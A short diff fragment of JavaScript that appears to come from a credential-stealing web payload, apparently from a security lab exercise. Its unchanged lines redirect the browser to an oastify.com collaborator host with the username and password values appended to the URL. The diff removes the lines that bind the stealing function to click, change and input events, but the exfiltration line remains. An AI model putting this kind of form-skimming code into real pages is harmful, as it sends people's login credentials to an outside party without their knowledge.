@@ -57,9 +57,4 @@ if(b.value.length>0) {
     window.location="https://au8me06o6dzs198npqzrmhcqwh28q2er.oastify.com/?username="+a.value+"&password="+b.value
 }
 
-a.form.onclick=f;
-a.onchange=f;
-b.onchange=f;
-a.oninput=f;
-b.oninput=f;
 }, 1000);
